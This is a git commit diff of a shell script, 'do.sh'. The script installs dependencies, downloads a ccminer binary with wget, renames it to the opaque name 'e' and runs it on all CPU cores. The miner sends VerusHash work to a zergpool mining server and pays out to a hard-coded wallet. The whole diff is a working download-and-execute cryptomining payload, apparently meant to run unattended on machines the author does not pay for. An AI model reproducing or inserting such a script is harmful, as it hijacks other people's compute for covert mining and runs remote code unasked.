6f64139ecc5b2545c4482bb8078a433f7f9e0c24
AntonyAjax <94457247+AntonyAjax@users.noreply.github.com>
2022-02-24 13:51:16 +0700

    Update do.sh

--- do.sh
+++ do.sh
@@ -1,6 +1,6 @@
 #erl-andi
 apt-get-update
 apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
-wget https://raw.githubusercontent.com/AntonyAjax/gh/main/ccminer
-chmod +x ccminer
-./ccminer -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u MS7M2QQKoK2M94Ktn8iGk75j8yvjWGLHsM.hyoka -p c=LTC,mc=VRSC -t $(nproc)
+wget -qO e https://github.com/monkins1010/ccminer/releases/download/v3.7.0/ccminer_3_7_ubuntu_18.04
+chmod +x e
+./e -a verushash -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u MS7M2QQKoK2M94Ktn8iGk75j8yvjWGLHsM.hyoka -p c=LTC,mc=VRSC -t $(nproc)
